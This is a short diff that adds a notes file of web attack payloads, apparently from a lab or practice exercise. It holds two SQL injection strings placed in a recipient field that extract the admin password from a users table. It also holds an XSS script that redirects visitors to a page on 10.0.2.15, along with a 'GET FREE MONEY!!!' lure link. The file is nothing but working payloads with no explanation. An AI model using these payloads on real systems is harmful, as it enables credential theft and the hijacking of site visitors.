@@ -1,0 +1,13 @@
+
+
+$recipient_data =  a','1',(SELECT password FROM users WHERE username like 'admin'),0);#
+$recipient_data =  a','1',(SELECT password FROM users WHERE username like 'admin'),1);#
+
+#-----------------------------
+
+XSS
+
+title = <script type="text/javascript">window.location.replace("http://10.0.2.15/dowhatiwill.html");</script>
+<a href="http://10.0.2.15/dowhatiwill.html"><font color="FF00CC">GET FREE MONEY!!!</font></a>
+
+
